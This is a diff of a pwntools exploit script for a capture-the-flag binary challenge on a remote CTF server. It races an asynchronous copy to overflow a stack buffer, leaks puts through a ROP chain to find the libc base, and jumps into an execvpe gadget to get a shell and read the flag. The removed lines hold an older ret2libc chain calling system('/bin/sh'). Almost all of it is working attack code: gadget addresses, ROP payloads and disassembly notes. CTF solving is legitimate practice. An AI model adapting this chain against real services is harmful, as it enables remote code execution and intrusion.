@@ -2,76 +2,79 @@ from pwn import *
 
 context.arch = "amd64"
 context.os = "linux"
-context.log_level = "debug"
+context.log_level = "warning"
 
-io = remote("nc1.ctfplus.cn", 11459)
+io = remote("nc1.ctfplus.cn", 19964)
 elf = ELF("./pwn")
 rop = ROP(elf)
 libc = ELF("./libc.so.6")
 
-sa = io.sendafter
-sl = io.sendline
-sla = io.sendlineafter
+pop_rdi = 0x4012a3
+libc_pop_rax_offset = 0x45eb0
+libc_pop_rbp_offset = 0x2a2e0
+async_copy_midentry = 0x4012f3
+retn = 0x401492
 
-global_msg = 0x404080
-global_msg_buf_size = 200
-dest_buf_siz = 32
+io.sendlineafter(b"Choice: ", b"1")
+io.send(flat( # written to .bss
+    b'A' * 32,
 
-pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
+    0x4040d0, # or any RW front .bss, e.g. .bss start (0x4040c0)
 
-log.debug("1")
-sla(b": ", b"1")
-sa(
-    b": ", 
-    flat(
-        b'A' * (dest_buf_siz + 8),
+    pop_rdi, elf.got["puts"],
+    elf.plt["puts"],
 
-        pop_rdi, elf.got["puts"],
-        elf.plt["puts"],
+    retn,
 
-        elf.symbols["main"]
-    ).ljust(global_msg_buf_size, b"A")
-)
+    async_copy_midentry # secondly (but latter part only) writting .bss payload 2 to stack
+    # .text:00000000004012F3                 lea     rax, s          ; "[Thread] Length check passed! Preparing"...
+    # .text:00000000004012FA                 mov     rdi, rax        ; s
+    # .text:00000000004012FD                 call    _puts
+    # .text:0000000000401302                 mov     edi, 7A120h     ; useconds
+    # .text:0000000000401307                 call    _usleep
+    # .text:000000000040130C                 mov     eax, cs:copy_length
+    # .text:0000000000401312                 movsxd  rdx, eax        ; n
+    # .text:0000000000401315                 lea     rax, [rbp+dest]
+    # .text:0000000000401319                 lea     rcx, global_msg
+    # .text:0000000000401320                 mov     rsi, rcx        ; src
+    # .text:0000000000401323                 mov     rdi, rax        ; dest
+    # .text:0000000000401326                 call    _memcpy
+    # .text:000000000040132B                 lea     rax, aThreadCopyDone ; "[Thread] Copy done! Exiting thread..."
+    # .text:0000000000401332                 mov     rdi, rax        ; s
+    # .text:0000000000401335                 call    _puts
+    # .text:000000000040133A                 jmp     short loc_40134B
+))
 
-log.debug("2")
-sla(b": ", b"2")
-sla(b": ", str(dest_buf_siz).encode())
+io.sendlineafter(b"Choice: ",b"2")
+io.sendlineafter(b"Length: ",b'1')
 
-log.debug("3")
-sla(b": ", b"3")
+io.sendlineafter(b"Choice: ",b"3") # Choice 3 here, 'async_puts' writting .bss playload 1 to stack
 
-log.debug("2")
-sa(b"y...", b"2\n")
-sa(b": ", str(global_msg_buf_size).encode())
+io.sendline(b"2")
+io.recvuntil(b"[Thread] Length check passed! Preparing to copy...") # can switch with previous line
+io.sendline(b"512")
 
-io.recvuntil(b"d...\n")
-puts = u64(io.recv(6).ljust(8, b"\x00"))
-log.debug("Address of 'puts':\n" + hexdump(puts))
+io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
+libc_base=u64(io.recv(6)+b"\x00\x00") - libc.sym.puts
 
-libc.address = puts - libc.sym["puts"]
-binsh = next(libc.search(b"/bin/sh\x00"))
+io.sendline(b"1")
+io.recvuntil(b"[Thread] Length check passed! Preparing to copy...")
+io.send(flat( # write to .bss again
+    [retn] * 8, # 3 ~ 20 available
+    libc_base + libc_pop_rax_offset, 0, # rax = 0
+    libc_base + libc_pop_rbp_offset, 0x404800, # RBP = .bss, must >= 0x404186 when interior 0x4040d0 selected from global_msg
+    libc_base + 0xebd43
+    # .text:00000000000EBD43                 lea     r10, [rbp+var_50]
+    #   ; R10 = RBP + var_50;
+    # .text:00000000000EBD47                 mov     [rbp+var_50], rax
+    #   ; R10 = *(uint64_t *)(RBP + var_50) = RAX = 0;
+    # .text:00000000000EBD4B                 jmp     loc_EBC79
+    #
+    # .text:00000000000EBC79 loc_EBC79:                              ; CODE XREF: execvpe+53B↓j
+    # .text:00000000000EBC79                 mov     qword ptr [r10+10h], 0
+    #   ; *(uint64_t *)(R10 + 0x10) = *(uint64_t *)(RBP + var_50 + 0x10) = RAX = 0;
+))
 
-# log.debug("1")
-# sla(b": ", b"1")
-# sa(
-#     b": ",
-#     flat(
-#         b"A" * (dest_buf_siz + 8),
-
-#         pop_rdi, binsh,
-#         libc.symbols["system"]
-#     ).ljust(global_msg_buf_size, b"A")
-# )
-
-# log.debug("2")
-# sla(b": ", b"2")
-# sla(b": ", str(dest_buf_siz).encode())
-
-# log.debug("3")
-# sla(b": ", b"3")
-
-# log.debug("2")
-# sa(b"y...", b"2\n")
-# sl(str(global_msg_buf_size).encode())
-
-io.interactive()
+io.recvuntil(b"[Thread] Copy done! Exiting thread...\n")
+io.sendline(b"cat flag")
+print(io.recvuntil(b"\n", drop=True).decode())
